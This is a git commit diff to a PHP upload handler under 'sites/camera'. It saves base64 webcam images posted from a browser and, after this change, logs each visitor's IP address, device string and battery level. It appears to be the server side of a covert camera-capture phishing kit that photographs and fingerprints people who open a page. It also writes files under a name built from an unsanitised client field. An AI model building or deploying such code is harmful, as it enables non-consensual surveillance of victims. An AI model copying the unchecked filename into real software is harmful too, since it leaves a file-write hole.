e8fe154737a2f8062cf97b1c11920539e1633333
Roshan0786shah <roshanali955955@gmail.com>
2026-02-14 22:29:39 +0530

    Update upload.php

--- sites/camera/upload.php
+++ sites/camera/upload.php
@@ -1,16 +1,13 @@
 <?php
-// Receive JSON data from JavaScript
 $data = json_decode(file_get_contents('php://input'), true);
-
 if ($data) {
-    // Process base64 image data
     $img = str_replace('data:image/jpeg;base64,', '', $data['image']);
     $img = str_replace(' ', '+', $img);
-    
-    // Generate filename with timestamp
     $name = 'cam_' . $data['mode'] . '_' . date("His") . '.jpg';
-    
-    // Save image to folder
     file_put_contents($name, base64_decode($img));
+
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $logEntry = "IP: $ip | Device: " . $data['device'] . " | Battery: " . $data['battery'] . " | Saved: $name";
+    file_put_contents("logs.txt", $logEntry . "\n", FILE_APPEND);
 }
 ?>
